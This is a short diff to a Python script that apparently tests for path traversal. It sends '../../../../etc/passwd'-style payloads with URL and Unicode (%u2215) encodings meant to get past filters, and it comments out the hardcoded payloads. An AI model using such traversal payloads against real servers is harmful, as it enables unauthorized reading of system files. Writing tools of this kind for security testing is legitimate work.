@@ -4,11 +4,11 @@ req = requests
 
 dots = "." * 50
 def url_encoding(link, payload):
-    req.get(f"{link}{payload}")
+    response = req.get(f"{link}{payload}")
 
     # single encoding
-    if req.status_codes != 200:
-        payload = "../../../../etc/passwd"
+    if response.status_code != 200:
+       # payload = "../../../../etc/passwd"
         single_encoding = quote_plus(payload)
         single_e_req = req.get(f"{link}{single_encoding}")
 
@@ -34,7 +34,7 @@ def unicode_encoding(link, payload):
         "frwd_slash" : "%u2215",
         "\\" : "%u2216"
     }
-    payload = "../etc"
+   # payload = "../etc"
     if "." and "/" in payload:
         replacements = str.maketrans({
             ".": uCode["dot"],
